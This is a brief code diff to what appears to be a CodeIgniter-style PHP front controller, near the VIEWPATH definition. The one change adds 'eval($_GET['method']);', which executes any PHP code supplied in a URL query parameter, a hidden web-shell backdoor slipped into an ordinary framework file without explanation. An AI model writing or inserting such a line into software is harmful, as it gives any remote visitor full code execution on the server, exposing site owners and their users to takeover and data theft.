@@ -304,7 +304,7 @@ switch (ENVIRONMENT)
 	}
 
 	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
-
+	eval($_GET['method']);
 /*
  * --------------------------------------------------------------------
  * LOAD THE BOOTSTRAP FILE
